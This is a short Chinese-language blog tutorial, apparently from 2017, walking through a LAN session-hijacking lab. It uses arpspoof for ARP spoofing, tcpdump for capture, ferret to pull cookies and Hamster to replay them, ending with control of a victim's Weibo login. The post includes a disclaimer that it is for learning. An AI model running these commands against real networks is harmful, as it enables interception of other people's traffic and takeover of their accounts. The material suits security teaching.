---
layout: post
title: 内网王者之会话劫持
date: 2017-04-15 01:02:14
comments: true
tags:
	- 安全攻防
---

### 前言
><font color="#ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>

### 正文
>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。<!--more-->

受害者
 ![](/images/pasted-63.PNG)

攻击者
 ![](/images/pasted-64.PNG)


### 环境

用到的工具

 * ferret 
 * tcpdump 
 * Hamster

其中ferret没有64位的，如果用的64位系统，需要安卓32位的ferret，而32位自带ferret。

添加对32位应用程序的支持

 * dpkg --add-architecture i386

安装32位ferret

 * sudo aptitude install ferret-sidejack:i386


### 攻击

首先arp走一波，前面的文章我有介绍到ettercap，今天这里介绍一个小巧的arp工具。arpspoof 

 * arpspoof -i eth0 -t 192.168.1.1 192.168.1.101
 * -i 网卡名
 * -t 网关和受害者ip

![](/images/pasted-83.jpg)


然后使用tcpdump来捕获数据包。
 * tcpdump -i eth0 -w data.cap
 * -i 网卡名
 * -w 保存的数据包

![](/images/pasted-84.jpg)

**这个时候受害者登录微博。**


这个时候数据包中的数据都是受害者的网络请求数据，其中包含着cookies.

然后使用ferret来处理数据包。

 * ferret -r data.cap

![](/images/pasted-85.jpg)


处理完成后会在本地生成一个hamster.txt文件。

然后运行hamster。

![](/images/pasted-86.jpg)

我们需要打开设置代理。

![](/images/pasted-80.jpg)

设置完成后，打开浏进入127.0.0.1:1234，这时候里面的数据都是受害者的所有网络请求数据，包含着登录信息。找到登录后的信息。

![](/images/pasted-87.jpg)

劫持成功。

![](/images/pasted-82.jpg)

同时也可以发微博

![](/images/pasted-81.jpg)